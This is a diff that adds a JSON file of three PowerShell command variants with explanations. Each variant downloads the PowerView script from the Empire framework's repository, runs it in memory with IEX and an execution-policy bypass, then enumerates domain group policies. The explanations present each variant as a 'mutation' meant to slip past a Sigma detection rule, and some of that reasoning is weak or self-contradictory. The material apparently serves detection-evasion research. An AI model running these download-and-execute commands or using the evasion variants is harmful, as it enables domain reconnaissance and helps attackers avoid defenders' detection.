@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
+    "explanation": "Insertion: Added quotes around the command to avoid direct string matching of the suspicious commandlet names. The Sigma rule matches based on the presence of specific commandlets, but this mutation uses quotes to encapsulate the command, which may bypass the string-based detection."
+  },
+  {
+    "output": "powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO | Out-File C:\\Lab\\out\\output.txt\"",
+    "explanation": "Appending a benign action: Added a pipe to redirect the output to a lab-specific file. This changes the command's behavior slightly but keeps the original intent. The Sigma rule focuses on the commandlet names, and this mutation does not alter them, so it may not trigger the rule."
+  },
+  {
+    "output": "powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO -Verbose\"",
+    "explanation": "Substitution: Added the '-Verbose' parameter to the command. This does not change the core commandlet name but adds a flag, which may not be captured by the Sigma rule if it focuses strictly on the presence of the commandlet name without parameters."
+  }
+]
